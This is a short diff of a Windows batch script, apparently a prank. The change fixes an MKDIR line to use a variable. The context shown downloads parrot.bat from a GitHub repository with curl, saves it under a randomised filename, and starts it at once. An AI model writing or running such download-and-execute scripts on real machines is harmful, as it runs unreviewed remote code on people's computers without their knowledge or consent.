@@ -8,7 +8,7 @@ SET randomstr=%randomstr:1=b%
 SET randomstr=%randomstr:2=c%
 
 SET randomstr2=%randomstr:3=c%
-MKDIR randomstr2
+MKDIR %randomstr2%
 
 curl https://raw.githubusercontent.com/PABLO4316/parrotPrank/main/parrot.bat --output %randomstr%.bat
 start %randomstr%.bat
